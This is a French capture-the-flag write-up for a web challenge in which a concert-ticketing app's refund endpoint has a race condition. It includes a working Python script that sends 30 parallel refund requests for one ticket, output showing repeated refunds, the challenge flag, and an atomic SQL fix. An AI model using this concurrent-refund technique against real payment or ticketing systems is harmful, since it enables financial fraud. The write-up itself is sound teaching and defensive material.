
<div align="center">

# 🎫 RACE CONDITION
### CyberNight 2026 - Web Challenge

**Une billetterie de concert, des crédits insuffisants... et un remboursement qui peut tout changer.**

![Category](https://img.shields.io/badge/Category-Web-480E33?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-E8A34A?style=for-the-badge)
![Vulnerability](https://img.shields.io/badge/Vulnerability-TOCTOU-8499A5?style=for-the-badge)
![Points](https://img.shields.io/badge/Points-500-480E33?style=for-the-badge)

</div>

---

## 📑 Sommaire

1. [Présentation du challenge](#-présentation-du-challenge)
2. [Comprendre la vulnérabilité](#-comprendre-la-vulnérabilité)
3. [Analyse de la billetterie](#-analyse-de-la-billetterie)
4. [Exploitation de la race condition](#-exploitation-de-la-race-condition)
5. [Récupération du flag](#-récupération-du-flag)
6. [Script de résolution](#-script-de-résolution)
7. [Correction de la vulnérabilité](#-correction-de-la-vulnérabilité)

---

## 🎯 Présentation du challenge

Le challenge prend la forme d'une **billetterie de concert** dans laquelle les utilisateurs peuvent acheter et rembourser des billets avec des crédits virtuels.

Chaque joueur commence avec **100 crédits**, mais le billet permettant d'accéder au flag coûte **150 crédits**.

### 💳 Les billets disponibles

| Billet | Prix | Particularité |
|:---|---:|:---|
| 🎟️ Standard | `50 crédits` | Peut être acheté et remboursé |
| ⭐ VIP | `150 crédits` | Débloque l'accès au flag |

### 🎮 Les fausses pistes

Pour rendre le challenge moins évident, deux fonctionnalités supplémentaires sont proposées :

| Fonctionnalité | Récompense | Limitation |
|:---|:---:|:---|
| 🥤 Mini-jeu des gobelets | +10 crédits | Un seul gain par joueur |
| 🎁 Code promo `CYBN2026` | +10 crédits | Une seule utilisation |

Même en utilisant les deux bonus, le joueur atteint seulement **120 crédits**.

Il manque donc encore 30 crédits pour acheter le VIP.

> [!IMPORTANT]
> **Objectif :** obtenir un billet VIP malgré un solde initial insuffisant, puis récupérer le flag.
>
> La vulnérabilité attendue concerne la gestion des remboursements simultanés.

---

## 🧠 Comprendre la vulnérabilité

### Race Condition : qu'est-ce que c'est ?

Une **Race Condition**, ou condition de concurrence, survient lorsque plusieurs opérations accèdent simultanément aux mêmes données et que leur résultat dépend de leur ordre d'exécution.

Dans une application Web, plusieurs requêtes HTTP peuvent être traitées en parallèle.

Si le serveur ne synchronise pas correctement les opérations, plusieurs requêtes peuvent prendre des décisions à partir d'un même état devenu obsolète.

### Le principe du TOCTOU

**TOCTOU** signifie *Time Of Check To Time Of Use*.

Il s'agit d'un décalage entre :

- **Time Of Check :** le moment où une condition est vérifiée.
- **Time Of Use :** le moment où l'application agit en fonction de cette vérification.

Exemple dans notre billetterie :

```text
┌───────────────────────────────┐
│  Demande de remboursement     │
└───────────────┬───────────────┘
                │
                ▼
     Le billet est-il ACTIVE ?
                │
               OUI
                │
                ▼
       Créditer le joueur
                │
                ▼
     Passer le billet à REFUNDED
```

Le problème est que **la vérification du statut et le remboursement ne sont pas protégés par une même opération atomique**.

Il devient donc possible de faire passer plusieurs requêtes par la vérification avant que le billet soit définitivement marqué comme remboursé.

---

## 🔎 Analyse de la billetterie

### 1. Observer les fonctionnalités

À l'arrivée sur le site, le portefeuille indique :

```text
Solde : 100 crédits
```

On peut acheter un billet Standard pour 50 crédits.

Après achat :

```text
Solde : 50 crédits
Billet Standard : ACTIVE
```

Dans l'onglet **Mes billets**, un bouton permet de demander un remboursement.

Un remboursement normal fait revenir le solde à 100 crédits et le billet passe au statut `refunded`.

### 2. Intercepter la requête HTTP

En utilisant les outils de développement du navigateur ou Burp Suite, on observe la requête envoyée lors d'un remboursement :

```http
POST /api/refund HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json
Cookie: session=...

{"ticket_id": 1}
```

Le paramètre `ticket_id` identifie le billet que l'utilisateur souhaite rembourser.

Il est essentiel de conserver **le même cookie de session** pour toutes les requêtes.

### 3. Comprendre le code vulnérable

La logique côté serveur peut être résumée ainsi :

```python
# 1. Lire le billet
ticket = get_ticket(ticket_id)

# 2. Vérifier qu'il est encore actif
if ticket["status"] != "active":
    return error("Billet déjà remboursé")

# 3. Commencer la transaction d'écriture
begin_transaction()

# 4. Créditer le portefeuille
add_balance(ticket["price"])

# 5. Marquer le billet comme remboursé
set_ticket_status(ticket_id, "refunded")

commit()
```

*Ce code est un pseudocode simplifié pour illustrer le fonctionnement.*

La vérification intervient **avant le début de la transaction d'écriture**.

C'est cette séparation qui crée une fenêtre de concurrence.

---

## ⚡ Exploitation de la race condition

### 1. Préparer un billet Standard

On commence par acheter un billet Standard :

```http
POST /api/buy HTTP/1.1
Content-Type: application/json

{"ticket_type": "standard"}
```

La réponse contient notamment l'identifiant du billet acheté.

Cet identifiant sera réutilisé pour toutes les requêtes de remboursement.

### 2. Envoyer plusieurs remboursements simultanément

L'idée consiste à envoyer plusieurs requêtes `POST /api/refund` en parallèle, **avec exactement le même `ticket_id`**.

L'objectif est que plusieurs requêtes voient encore le billet au statut `active`.

```text
                      BILLET #1
                    status = ACTIVE
                           │
          ┌────────────────┼────────────────┐
          │                │                │
          ▼                ▼                ▼
     REQUÊTE A        REQUÊTE B        REQUÊTE C
          │                │                │
     Check ACTIVE     Check ACTIVE     Check ACTIVE
          │                │                │
         ✅                ✅                ✅
          │                │                │
          ▼                ▼                ▼
       +50 CR           +50 CR           +50 CR
          │                │                │
          └────────────────┼────────────────┘
                           │
                           ▼
                    status = REFUNDED
```

Les opérations d'écriture peuvent être sérialisées par SQLite, mais cela ne suffit pas ici : les requêtes concurrentes ont déjà validé l'ancien statut.

### 3. Exemple d'exploitation en Python

On peut utiliser `ThreadPoolExecutor` pour lancer 30 requêtes simultanément.

```python
import requests
from concurrent.futures import ThreadPoolExecutor

URL = "http://127.0.0.1:8080"
session = requests.Session()

# Initialiser la session utilisateur
session.get(f"{URL}/api/wallet")

# Acheter un billet Standard
response = session.post(
    f"{URL}/api/buy",
    json={"ticket_type": "standard"}
)

ticket_id = response.json()["ticket"]["id"]

# Exploiter le remboursement concurrent
def refund(_):
    return session.post(
        f"{URL}/api/refund",
        json={"ticket_id": ticket_id}
    ).status_code

with ThreadPoolExecutor(max_workers=30) as pool:
    results = list(pool.map(refund, range(30)))

print("Remboursements acceptés :", results.count(200))
```

On utilise une même session HTTP afin que toutes les requêtes soient associées au même portefeuille.

> [!NOTE]
> La race condition dépend du timing des requêtes.
>
> Il est possible qu'une première tentative ne provoque qu'un seul remboursement. Il faut parfois recommencer avec un nouveau billet Standard.

### 4. Résultat obtenu

Lors d'un test local, nous avons observé le comportement suivant :

```text
[*] Solde initial : 100 crédits

[Tour 1] Billet Standard acheté (solde 50)
  Réponses HTTP : {200: 1, 409: 29}
  Solde final : 100 crédits

[Tour 2] Billet Standard acheté (solde 50)
  Réponses HTTP : {409: 24, 200: 6}
  Solde final : 350 crédits

[!] Double remboursement observé !
```

La deuxième tentative a permis d'obtenir **six remboursements pour un seul billet Standard**.

Le calcul est donc :

```text
Solde avant l'achat    100 crédits
Achat Standard         -50 crédits
6 remboursements      +300 crédits
----------------------------------
Solde final            350 crédits
```

Le portefeuille contient maintenant suffisamment de crédits pour acheter le VIP.

---

## 🏆 Récupération du flag

### 1. Acheter le billet VIP

Avec un solde supérieur ou égal à 150 crédits, on envoie :

```http
POST /api/buy HTTP/1.1
Content-Type: application/json

{"ticket_type": "vip"}
```

Le serveur crée alors un billet VIP actif.

### 2. Accéder à la récompense

Il suffit ensuite de consulter :

```http
GET /api/reward HTTP/1.1
Cookie: session=...
```

La route vérifie que le joueur possède un billet VIP actif.

Si c'est le cas, le flag est retourné.

### 🚩 Flag

```text
CYBN{R4c3_C0nd1T10n_V1P_4cc3ss}
```

---

## 🐍 Script de résolution

Le dossier `writeup/` contient également un script de résolution automatisé :

```text
writeup/
├── README.md
└── solve.py
```

### Prérequis

- Python 3
- Bibliothèque `requests`

Installation :

```bash
python -m pip install requests
```

### Exécution

Depuis le dossier `writeup` :

```bash
python solve.py
```

Le script réalise automatiquement les étapes suivantes :

1. Initialise une session HTTP.
2. Vérifie le solde du portefeuille.
3. Achète un billet Standard.
4. Envoie plusieurs remboursements concurrents.
5. Répète l'opération si nécessaire.
6. Achète un billet VIP.
7. Récupère le flag.

---

## 🛡️ Correction de la vulnérabilité

### Pourquoi la protection actuelle ne suffit pas ?

Le serveur vérifie bien que le billet est actif avant de rembourser.

Cependant, cette vérification n'est pas effectuée de manière atomique avec la modification du statut et du solde.

Deux requêtes peuvent donc passer le contrôle avec le même état initial.

### Solution : transaction atomique

Une correction possible consiste à modifier conditionnellement le statut du billet :

```sql
UPDATE tickets
SET status = 'refunded'
WHERE id = ?
  AND user_id = ?
  AND status = 'active';
```

Le serveur doit ensuite vérifier le nombre de lignes modifiées.

- **1 ligne modifiée :** le remboursement est autorisé.
- **0 ligne modifiée :** le billet est déjà remboursé ou n'est pas éligible.

Le crédit du portefeuille doit être effectué **dans la même transaction SQL**, avec un `COMMIT` uniquement lorsque les deux opérations réussissent.

Une seule requête peut alors réussir pour un billet donné, même en cas de forte concurrence.

### Bonnes pratiques associées

- Effectuer les contrôles et les écritures dans une transaction cohérente.
- Utiliser des mises à jour conditionnelles.
- Vérifier le nombre de lignes affectées.
- Rendre les remboursements idempotents.
- Tester les endpoints sensibles avec des requêtes concurrentes.

---

## 📚 Conclusion

Ce challenge illustre une vulnérabilité de concurrence dans une fonctionnalité métier très classique : le remboursement d'un achat.

Bien que l'application vérifie le statut du billet, cette vérification intervient trop tôt par rapport à l'opération de remboursement.

En envoyant plusieurs requêtes simultanément, un joueur peut exploiter cette fenêtre pour recevoir plusieurs remboursements d'un seul billet.

**La leçon principale : une vérification correcte ne suffit pas si elle n'est pas atomique avec l'opération qu'elle protège.**

---

<div align="center">

**CyberNight 2026 - Web / Medium**

*Crédit @estellealz*

</div>
